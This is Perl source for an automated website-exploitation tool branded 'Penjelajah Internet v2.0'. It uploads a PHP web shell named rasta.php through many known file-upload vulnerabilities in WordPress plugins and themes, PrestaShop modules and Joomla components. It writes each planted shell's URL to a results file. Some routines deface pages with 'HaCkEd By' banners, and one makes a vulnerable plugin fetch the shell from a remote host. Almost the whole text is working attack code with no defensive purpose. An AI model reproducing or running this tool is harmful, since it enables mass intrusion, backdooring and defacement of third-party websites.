...
#Coded By Penjelajah Internet 10/10/2017
...
sub banner() {
system("title  Penjelajah Internet v2.0");
...
print color('reset');
print "                       ";
print colored ("[ PEnjelajh Internet v2.0 ]",'white on_red');  
print colored ("[ Coded By Penjelajah Internet ]\n",'white on_red');
print "                           ";
...
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["rasta.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/rasta.php?X=Attacker";
...
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["rasta.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~ /\/uploads\/blaze\/(.*?)\/big\/rasta.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/rasta.php?X=Attacker";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["rasta.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/catpro\/(.*?)\/big\/rasta.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/catpro/$uploadfolder/big/rasta.php?X=Attacker";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["rasta.php"],]);

$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/rasta.php?X=Attacker";
...
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["rasta.php"], dm_upload => '',]);
$dmup="$site/wp-content/plugins/downloads-manager/upload/rasta.php?X=Attacker";
...
$formcraftup="$site/wp-content/plugins/formcraft/file-upload/server/php/files/rasta.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["rasta.php"], task => 'lvo_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/levoslideshow\/(.*?)\/big\/rasta.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/levoslideshow/$uploadfolder/big/rasta.php?X=Attacker";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["rasta.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/powerzoomer\/(.*?)\/big\/rasta.php/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/uploads/powerzoomer/$uploadfolder/big/rasta.php?X=Attacker";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
...
my $gravityformsres = $ua->post($url, Content_Type => "form-data", Content => [file => ["Back.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.php.jd"]);
...
my $revslidres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["rasta.zip"]]);

my $revs = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/rasta.php")->content;
my $revavada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/rasta.php")->content;
my $revstriking = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/rasta.php")->content;
my $revincredible = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/rasta.php")->content;
my $revultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/rasta.php")->content;
my $revmedicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/rasta.php")->content;
my $revcentum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/rasta.php")->content;
my $revbeachapollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/rasta.php")->content;
my $revcuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/rasta.php")->content;
my $revpindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/rasta.php")->content;
my $revdesignplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/rasta.php")->content;
my $revrarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/rasta.php")->content;
my $revandre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/rasta.php")->content;
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/rasta.php?X=Attacker\n";
close (TEXT);
}
...
my $revslidajaxres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_captions_css", data => "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>HaCKeD BY Penjelajah Internet<b>"]);
...
$ua->timeout(10);
$ua->agent($useragent);
my $showbizres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "showbiz_ajax_action", client_action => "update_plugin", update_file => ["rasta.php"]]);

$showbizup = $site . '/wp-content/plugins/showbiz/temp/update_extract/rasta.php?X=Attacker';
...
my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["rasta.php"], action => 'upload_ad_image', path => '',]);
$adsup="$site/wp-content/plugins/simple-ads-manager/rasta.php?X=Attacker";
...
my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["rasta.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/rasta.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/rasta.php?X=Attacker";
...
$wpmdshell = "http://testatranslations.com/shell/rasta.php";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/rasta.php?X=Attacker";
...
my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['rastat.zip', => 'rastat.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
$wysijaup = "$site/wp-content/uploads/wysija/themes/rastat/rasta.php?X=Attacker";
...
$inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/rasta.php?X=Attacker";
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["rasta.php"],]);
...
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/rasta.php?X=Attacker";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["rasta.php"],]);
...
$reflexup = "$site/wp-content/uploads/$year/$month/rasta.php?X=Attacker";
my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["rasta.php"],]);
...
$sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/rasta.php?X=Attacker";
my $field_name = "files[]";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["rasta.php"] ]
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/rasta.php?X=Attacker";
...
$jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/$year/$month/rasta.gif";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/rasta.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$Synopticup="$site/wp-content/uploads/markets/avatars/rasta.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wpshopup="$site/wp-content/uploads/rasta.php?X=Attacker";
...
$index='<p align="center"><img border="0" src="http://vignette4.wikia.nocookie.net/trollpasta/images/3/34/Fuck-you-cartoon-meme.gif" width="339" height="476"></p><pre>&nbsp;</pre><div align="center"><p align="center" class="auto-style2">
    <font face="Bradley Hand ITC" size="6">HaCkEd By Penjelajah Internet</font></p>
    <p align="center" class="auto-style2">';
$gassface = POST $ajx, [
'id' => $sirina, 'slug' => '/m.htm', 'title' => 'HaCkEd By Penjelajah Internet ', 'content' => $index];
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["rasta.php"],]);

$columnadvertsup="$site/modules/columnadverts/slides/rasta.php?X=Attacker";
...
$soopamobileup="$site/modules/soopamobile/slides/rasta.php?X=Attacker";
...
$soopabannersup="$site/modules/soopabanners/slides/rasta.php?X=Attacker";
...
$vtermslideshowup="$site/modules/vtermslideshow/slides/rasta.php?X=Attacker";
...
$simpleslideshowup="$site/modules/simpleslideshow/slides/rasta.php?X=Attacker";
...
$productpageadvertsup="$site/modules/productpageadverts/slides/rasta.php?X=Attacker";
...
$homepageadvertiseup="$site/modules/homepageadvertise/slides/rasta.php?X=Attacker";
...
$homepageadvertise2up="$site/modules/homepageadvertise2/slides/rasta.php?X=Attacker";
...
$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise/slides/rasta.php?X=Attacker";
...
$attributewizardproup="$site/modules/attributewizardpro/file_uploads/rasta.php?X=Attacker";
...
$oneattributewizardproup="$site/modules/1attributewizardpro/file_uploads/rasta.php?X=Attacker";
...
$attributewizardproOLDup="$site/modules/attributewizardpro.OLD/file_uploads/rasta.php?X=Attacker";
...
$attributewizardpro_xup="$site/modules/attributewizardpro_x/file_uploads/rasta.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["rasta.php.png"],]);

$advancedsliderup="$site/modules/advancedslider/uploads/rasta.php.png?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["rasta.php.png"],]);

$cartabandonmentproup="$site/modules/cartabandonmentpro/uploads/rasta.php.png?X=Attacker";
...
$cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/rasta.php.png?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["rasta.php.mp4"],]);

$videostabup="$site/modules/videostab/uploads/rasta.php.mp4?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["rasta.php"],]);

$wg24themeadministrationup="$site/modules//wg24themeadministration///img/upload/rasta.php?X=Attacker";
...
$fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/rasta.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["rasta.php"],]);

$wdoptionpanelup="$site/modules/wdoptionpanel/upload/rasta.php?X=Attacker";
...
$pk_flexmenuup="$site/modules/pk_flexmenu/uploads/rasta.php?X=Attacker";
...
$pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/rasta.php?X=Attacker";
...
################ megamenu #####################
sub megamenu(){
my $url = "$site/modules/megamenu/uploadify/uploadify.php?id=rasta.php";
my $shell ="rasta.php.png";
...
$megamenuup="$site/rasta.php.png?X=Attacker";
...
$tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/rasta.php?X=Attacker";
...
$psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/rasta.php?X=Attacker";
...
$masseditproductup="$site/masseditproduct/uploads/file/rasta.php?X=Attacker";
...
sub comjdownloads(){
$file="Jattack.rar";
$filez="rasta.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/rasta.php.j?X=Attacker';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Penjelajah Internet", mail=>"snowdenbill02@gmail.com", filetitle =>"Penjelajah Internet xD", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
...
$def = $site . '/images/jdownloads/screenshots/rasta.html.j';
$filee="Jattack.rar";
$filezz="rasta.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Penjelajah Internet", mail=>"snowdenbill02@gmail.com", filetitle =>"Penjelajah Internet xD", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
...
$comfabrikupp="$site/media/rasta.php?X=Attacker";
...
$comfabrikupp2="$site/rasta.php?X=Attacker";
...
my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["rasta.jpg"], name => "rasta.html"]
           
            );

$comadsmanagerup="$site/tmp/plupload/rasta.html";
...
$weblinksup= "$site/images/rasta.gif";
...
$simplefileuploadsup= "$site/modules/mod_simplefileuploadv1.3/elements/rasta.php?X=Attacker";
